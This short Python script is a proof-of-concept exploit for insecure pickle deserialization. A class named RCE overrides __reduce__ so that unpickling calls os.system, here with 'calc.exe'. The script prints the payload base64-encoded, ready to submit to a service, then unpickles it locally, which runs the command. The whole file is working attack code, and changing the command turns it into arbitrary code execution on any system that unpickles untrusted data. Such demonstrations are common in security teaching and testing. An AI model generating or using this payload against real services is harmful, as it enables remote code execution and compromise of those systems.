import pickle
import base64
import os 
import subprocess

class RCE: 
    def __reduce__(self):
        cmd = ("calc.exe")
        return os.system, (cmd,)
    
if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
    deserialised = pickle.loads(pickled)

